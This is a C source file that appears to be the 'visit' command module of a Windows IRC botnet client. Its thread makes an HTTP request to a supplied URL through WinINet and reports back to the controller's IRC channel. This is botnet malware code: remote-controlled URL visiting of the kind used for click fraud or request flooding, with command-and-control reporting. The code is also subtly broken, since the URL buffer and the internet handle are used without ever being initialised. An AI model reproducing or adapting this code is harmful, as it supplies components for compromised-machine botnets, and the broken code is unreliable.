

#include "include.h"
#include "hell.h"

#ifndef NO_VISIT

DWORD WINAPI VISIT_THREAD(LPVOID param)
{
	HINTERNET ch = 0, req = 0;
	char visit[125];
	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[2048];

	char ih[125];
	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));
	
	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;
	
	do {
		// crack the url (break it into its main parts)
		if (!InternetCrackUrl(visit, strlen(visit), 0, &url)) {
			sprintf(sendbuf,"Invalid URL.");
			break;
		}
		
		// copy url parts into variables
		if (url.dwHostNameLength > 0)
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		int vport = url.nPort;
		if (url.dwUserNameLength > 0)
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0)
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0)
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);
		
		ch = InternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"Could not open a connection.");
			break;
		}
		
		req = HttpOpenRequest(ch, NULL, vpath, NULL, visit, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"Failed to connect to HTTP server.");
			break;
		}
		
		if (HttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"URL visited.");
		else
			sprintf(sendbuf,"Failed to get requested URL from HTTP server.");
	} while(0);
	
	// irc_privmsg(visit.sock, visit.chan, sendbuf, visit.notice);
	BOT->cIRC.SendData("PRIVMSG %s :-visit- %s\r\n",BOT->cIRC.cConf.cChan.c_str(),visit);

	
	InternetCloseHandle(ch);
	InternetCloseHandle(req);
	
   	ExitThread(0);
    return 0;
}
#endif